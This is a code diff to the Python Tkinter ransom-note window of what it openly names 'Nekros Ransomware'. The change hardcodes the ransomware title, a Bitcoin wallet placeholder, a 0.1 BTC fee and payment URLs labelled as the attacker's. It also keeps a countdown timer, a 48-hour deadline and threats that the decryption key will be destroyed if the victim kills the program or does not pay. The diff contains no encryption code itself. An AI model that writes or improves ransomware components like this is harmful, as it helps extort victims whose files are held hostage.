@@ -16,10 +16,10 @@ except ImportError:
 try:
     import check_log_gui #Importing GUI to Show Data of log.txt in GUI Window
     import decryptor_gui #Importing GUI to Facilitiate decryption process
-except ImportError: 
+except ImportError:
     from after_stage2 import check_log_gui #Importing GUI to Show Data of log.txt in GUI Window
-    from after_stage2 import decryptor_gui #Importing GUI to Facilitiate decryption process    
-   
+    from after_stage2 import decryptor_gui #Importing GUI to Facilitiate decryption process
+
 from PIL import Image, ImageTk
 import os.path
 
@@ -30,37 +30,31 @@ import datetime
 #Module Used in Opening Site in Browser, MultiThreading etc.
 import sys, webbrowser, threading
 
-import configparser   #Module to Read config.txt
- 
-
-def start_gui(machine_id):
+def start_gui(machine_id, message):
     '''Starting point when module is the main routine.'''
     global root
     global prog_location
     prog_call = sys.argv[0]
     prog_location = os.path.split(prog_call)[0]
-    root = tk.Tk()  
-    top = Toplevel1(root, machine_id)
+    root = tk.Tk()
+    top = Toplevel1(root, machine_id, message)
     t1 = threading.Thread(target=top.count_down)
     t1.start()
     root.mainloop()
 
 class Toplevel1:
-    def __init__(self, top=None, machine_id="TEST MACHINE ID"):
+    def __init__(self, top=None, machine_id="TEST MACHINE ID", message="Your files are encrypted."):
         '''This class configures and populates the toplevel window.
            top is the toplevel containing window.'''
-           
-        config = configparser.RawConfigParser()
-        config.read('config.txt')
-        
-        self.machine_id = machine_id
-        self.ransomeware_title = config.get('GUI_SETTINGS', 'ransomeware_title') #Retriving From config.txt
-        self.wallet_addr = config.get('GUI_SETTINGS', 'wallet_addr') #Retriving From config.txt
-        self.btc_fee = config.get('GUI_SETTINGS', 'btc_fee') #Retriving From config.txt
-        self.retrive_key_url = config.get('GUI_SETTINGS', 'retrive_key_url') #Retriving From config.txt
-        self.about_us_url = config.get('GUI_SETTINGS', 'about_us_url') #Retriving From config.txt
 
-           
+        self.machine_id = machine_id
+        self.ransomeware_title = "Nekros Ransomware"
+        self.wallet_addr = "YOUR_BITCOIN_WALLET_ADDRESS"
+        self.btc_fee = "0.1 BTC"
+        self.retrive_key_url = "http://localhost:3000" # To be replaced with the new website URL
+        self.about_us_url = "http://localhost:3000"
+
+
         _bgcolor = '#d9d9d9'  # X11 color: 'gray85'
         _fgcolor = '#000000'  # X11 color: 'black'
         _compcolor = '#d9d9d9' # X11 color: 'gray85'
@@ -124,67 +118,39 @@ class Toplevel1:
         self.Scrolledtext1.configure(selectbackground="#c4c4c4")
         self.Scrolledtext1.configure(selectforeground="black")
         self.Scrolledtext1.configure(wrap="none")
-        
-        self.message = '''        
-What Happened to Your Computer?
-_____________________________________________
-        
-Your important files are encrypted with Military Grade AES-256 bit Encryption.
-        
-All your documents, photos, videos & other files are now inaccessible, & 
-cannot be unlocked  without the decryption key. This key is currently 
-being stored on a remote server.
-        
-Don't waste your Time in looking for ways to decrypt your files. Files can only
-be decrypted via our decryptor with valid decryption key.
-        
-        
-How Can You Recover Your Files?
-_________________________________________
-        
-Simply Acquire Decryption key by paying given amount of Bitcoin & paste key
-in decryptor to make your files accessible.
-        
-        
-        
-What Happen If You Don't Pay?
-___________________________________________
-        
-If you fail to take action within this time as shown in this window, the 
-decryption key will be destroyed and access to your files will be
-permanently lost.
 
+        self.message = message + '''
 
 COPY YOUR MACHINE ID Carefully, Without Any Spaces.
 ________________________________________________________________________________________
-        
+
 [+]  YOUR MACHINE ID :  '''+ self.machine_id +'''
 ________________________________________________________________________________________
-                
+
 ________________________________________________________________________________________
-        
+
 [+]  WALLET ADDRESS  :  '''+ self.wallet_addr +'''
 ________________________________________________________________________________________
-                
+
 __________________________________________
 [$$]  BITCOIN FEE     :     '''+self.btc_fee+'''
 __________________________________________
-        
-        
-                        DON'T DARE TO KILL ME, 
+
+
+                        DON'T DARE TO KILL ME,
     OTHERWISE KEY WILL AUTOMATICALLY GET DESTROYED!
 
 
         '''
         self.Scrolledtext1.insert(tk.INSERT, self.message)
         self.Scrolledtext1.configure(state='disabled')
-        
+
         self.Langauge = tk.StringVar()
         self.value_list = ['English', 'Hindi', 'Urdu', 'Russian']
         self.TCombobox1 = ttk.Combobox(top, values=self.value_list)
         self.TCombobox1.place(relx=0.796, rely=0.032, relheight=0.042
                 , relwidth=0.184)
-        self.TCombobox1.current(0)        
+        self.TCombobox1.current(0)
         self.TCombobox1.configure(textvariable=self.Langauge)
         self.TCombobox1.configure(takefocus="")
         self.TCombobox1.configure(state='readonly')
@@ -226,7 +192,7 @@ __________________________________________
         self.Label7.configure(disabledforeground="#a3a3a3")
         self.Label7.configure(font=font11)
         self.Label7.configure(foreground="#ffff00")
-        self.Label7.configure(text=self.wallet_addr) #BITCOIN WALLET ADDRESS 
+        self.Label7.configure(text=self.wallet_addr) #BITCOIN WALLET ADDRESS
 
         self.Label8 = tk.Label(self.Labelframe1)
         self.Label8.place(relx=0.538, rely=0.523, height=21, width=224
@@ -374,22 +340,22 @@ __________________________________________
         self.Label6.configure(foreground="#ffff00")
         self.Label6.configure(highlightbackground="#d9d9d9")
         self.Label6.configure(highlightcolor="black")
-        self.Label6.configure(text='''!!! AFTER 48 HOURS  !!!''')             
+        self.Label6.configure(text='''!!! AFTER 48 HOURS  !!!''')
 
     def retrive_key(self):
         attacker_url = self.retrive_key_url
         webbrowser.open_new(attacker_url)
-        
+
     def about_us(self):
         attacker_url = self.about_us_url
-        webbrowser.open_new(attacker_url)      
+        webbrowser.open_new(attacker_url)
 
     def count_down(self):
         for t in range(36000, -1, -1):
             sf = str(datetime.timedelta(seconds=t))
             self.time_str.set(sf)
             root.update()
-            time.sleep(1) 
+            time.sleep(1)
 
     def change_language(self, event=None):
         selected_language = self.Langauge.get()
@@ -404,7 +370,7 @@ __________________________________________
                 self.Scrolledtext1.configure(state='disabled')
             elif selected_language == 'English':
                 self.Scrolledtext1.configure(state='normal')
-                self.Scrolledtext1.insert(tk.INSERT, self.message) 
+                self.Scrolledtext1.insert(tk.INSERT, self.message)
                 self.Scrolledtext1.configure(state='disabled')
 
 # The following code is added to facilitate the Scrolled widgets you specified.
@@ -529,9 +495,4 @@ def _on_shiftmouse(event, widget):
             widget.xview_scroll(1, 'units')
 
 if __name__ == '__main__':
-    start_gui("555f9f3b573f4c41e7de2c5b3f97ed54")  #Takes Machine ID As Argument
-
-
-
-
-
+    start_gui("555f9f3b573f4c41e7de2c5b3f97ed54", "Your files have been encrypted by Nekros!")
